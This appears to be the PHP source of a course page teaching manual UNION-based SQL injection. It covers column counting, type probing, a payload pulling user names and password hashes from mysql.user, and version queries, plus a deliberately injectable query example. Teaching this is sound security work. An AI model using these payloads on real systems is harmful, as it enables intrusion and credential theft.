<?php
    require_once 'relative_init.php';
    include_once SHARED_PATH . 'course_header.php';
    
    // Syntax highlighting
    echo '<script type="text/javascript" src="' . JAVASCRIPT_PATH . 'sql_highlighting.js" defer></script>';

    // Title and description are set in page_header.php
    $title = "Union based";
    $description = "Learn how to manually exploit SQL vulnerabilities using UNION attack.";
    include_once SHARED_PATH . 'page_header.php';

    // Legal disclaimer and terminal animations
    $terminal_text = 'sudo apt-get install -y python3';
    include SHARED_PATH . 'terminal_text.php';
    include_once SHARED_PATH . 'legal_disclaimer.php';
    $terminal_text = 'python3 --version';
    include SHARED_PATH . 'terminal_text.php';

    // Tutorial navigation buttons
    $previous = 'stacked-queries.php';
    $home = 'sql-injection-techniques-course-home.php#tutorials';
    $next = 'error-based.php';
    include SHARED_PATH . 'tutorial_navigation.php';

    // Table of contents
    include SHARED_PATH . 'table_of_contents.php';
?>

    <div class="course-top-level-container">
      <h1 class="title toc">Union based attack overview</h1>
      <p>
        A SQL Union-based attack is a method where the attacker uses the
        <span class="inline-code">UNION</span> keyword in order to extract
        data from other tables in the database. Note that this is only possible
        if there is an injection point and the website returns the results
        of the SQL queries in the response.
      </p>
      <p>
        Additionally, there are two more requirements for a successful union attack.
      </p>
      <ol>
        <li>The UNION statement must contain the same number of columns as the original SELECT statement</li>
        <li>The data types in the UNION statement must be compatible with those in the SELECT statement</li>
      </ol>
      <p>
        This means, for example, that if the select statement we are injecting to
        returns three columns of data of type <span class="inline-code">VARCHAR(20)
        </span>, then we can only extract three columns at a time that are data
        types that are compatible with <span class="inline-code">VARCHAR(20)</span>;
        for instance, <span class="inline-code">CHAR(n)</span> where n &leq; 20.
      </p>
      
      <h1 class="title toc">Find the number of columns in the original SELECT statement</h1>
      <p>
        There are two well-known methods for finding the number of columns of 
        the original SELECT statement that we want to union attack. This first method
        takes advantage of the fact that you can order columns by index rather than
        column name in SQL statements. The second is a clever way of exploiting
        the UNION keyword and taking advantage of the fact that most SQL data types
        can cast to NULL.
      </p>
      <p>
        As mentioned, method one involves injecting a series of payloads where the
        index is incremented in each ORDER BY payload until there is a noticeable response
        indicating that the index is out of range.
      </p>

<pre class="lang-sql default-code-style dark-mode-background">
' ORDER BY 1 -- 
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --</pre>

      <p>
        This payload takes advantage of the fact that you can order results by
        the column index rather than the column name in select statements. In SQL,
        indexing starts at 1. The example below shows this idea in practice. 
      </p>

<pre class="lang-sql default-code-style dark-mode-background">
# Example 1 (the two queries are equivalant)
SELECT first_name, last_name FROM EMPLOYEE_TBL ORDER BY first_name;
SELECT first_name, last_name FROM EMPLOYEE_TBL ORDER BY 1;

# Example 2 (the two queries are equivalant)
SELECT first_name, last_name FROM EMPLOYEE_TBL ORDER BY last_name;
SELECT first_name, last_name FROM EMPLOYEE_TBL ORDER BY 2;</pre>

      <p>
        The idea is that eventually the index will be out of range and SQL will
        generate an error which may be visible in the HTML response. Other times,
        you will be able to tell the index is out of range because the SELECT query
        will return no results. In the above example, the payload <span class="inline-code">
        ' ORDER BY 3 --</span> would ideally generate some sort of noticeable error
        response in the HTML because there is no third column being selected in
        the statement.
      </p>
      <p>
        The second common method for figuring out the number of columns in the
        original select is by using the <span class="inline-code">UNION</span>
        keyword combined with selecting NULL values. The idea for this method
        is the inverse of the <span class="inline-code">ORDER BY</span> in the 
        sense that you are looking to detect errors for every payload except
        when you specify the proper number of NULL values that matches the 
        number of columns in the original SELECT statement.
      </p>
      <p>
        The example below demonstrates the payloads you would use for this method.
      </p>

<pre class="lang-sql default-code-style dark-mode-background">
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT NULL,NULL,NULL,NULL --</pre>

      <p>
        We expect errors with each payload unless the number of columns matches
        the number of NULLs in the payload. In the below example, every payload
        will return an error except for the last because the number of columns 
        in the SELECT statement matches the number of NULLs in the last payload.
      </p>

<pre class="lang-sql default-code-style dark-mode-background">
# Injection point
$query = "SELECT first_name, last_name, salary FROM EMPLOYEE_TBL WHERE last_name='" . $_GET['filter'] . "'";

# Payload 1
hack' UNION SELECT NULL --

# Resulting query 1 (returns error)
SELECT first_name, last_name, salary FROM EMPLOYEE_TBL WHERE last_name='hack'
UNION SELECT NULL --

# Payload 2
hack' UNION SELECT NULL, NULL --

# Resulting query 2 (returns error)
SELECT first_name, last_name, salary FROM EMPLOYEE_TBL WHERE last_name='hack'
UNION SELECT NULL, NULL --

# Payload 3
hack' UNION SELECT NULL, NULL, NULL --

# Resulting query 3 (no error because number of columns is 3)
SELECT first_name, last_name, salary FROM EMPLOYEE_TBL WHERE last_name='hack'
UNION SELECT NULL, NULL, NULL --</pre>

      <h1 class="title toc">Guess the column data type</h1>
      <p>
        The purpose of UNION attacks is to extract data from other tables or
        columns. To do this, we must ensure the data types of the columns in the
        original select statement are compatible with the data types that we want
        to extract from other tables.
      </p>
      <p>
        We can do this by passing a constant value of the data type we want to
        extract in a UNION injection statement. For instance, if we want to extract
        data from another table that is a type of string data and we have
        an injection point that is selecting three columns, we could use the following
        payloads to determine if any one of the columns is compatible with string
        like data types.
      </p>

<pre class="lang-sql default-code-style dark-mode-background">
1' UNION SELECT 'hack', NULL, NULL -- 
1' UNION SELECT NULL, 'hack', NULL -- 
1' UNION SELECT NULL, NULL, 'hack' -- </pre>

      <p>
        In the above example, we are individually testing if each column in the
        original select statement is compatible with string data types. If the
        column that corresponds to the <span class="inline-code">'hack'</span>
        string in the injection payload is not compatible with string data types,
        we would expect to see some sort of error response in the HTML or no
        response from the select statement.
      </p>

      <h1 class="title toc">Retrieve data</h1>
      <p>
        Now that you know how many columns the back end is selecting, as well
        as their compatible data types, we can retrieve data using a union attack.
      </p>
      <p>
        For this example, suppose we have found an injection point that selects
        two columns of type string. Then the following payload would retrieve
        all usernames and password hashes of all database schema owners on MySQL
        (assuming the application schema owner has proper permissions to the
        <span class="inline-code">mysql</span> database).
      </p>

<pre class="lang-sql default-code-style dark-mode-background">
1' UNION SELECT User, Password FROM mysql.user -- </pre>

      <h1 class="title toc">Get the database version</h1>
      <p>
        Suppose we have found a union vulnerability whose vulnerable select
        statement selects two columns. We can now craft a payload to get the
        database version.
      </p>

<pre class="lang-sql default-code-style dark-mode-background">
# For MySQL and PostgreSQL
' UNION SELECT version(), 'a' -- 

# For MS SQL
' UNION SELECT @@version, 'a' -- 
</pre>

      <p>
        The <span class="inline-code">'a'</span> is dummy data because the number
        of columns have to match the original select statement when using a union
        statement (in our case, the number of columns in the vulnerable select
        statement is two). The first payload returns the following on my home server
        that I am running a vulnerable website on.
      </p>

<pre class="lang-sql default-code-style dark-mode-background">  
10.3.34-MariaDB-0+deb10u1   a</pre>

    </div>

    <?php include SHARED_PATH . 'tutorial_navigation.php'; ?>
    <div class="course-top-level-container">
    <?php
        $tags = array(
            'Sqlmap',
            'Python3',
            'Debian Linux',
            'Bash'
        );
        
        generate_technology_tags($tags);
    ?>
    </div>

<?php require_once SHARED_PATH . 'page_footer.php'; ?>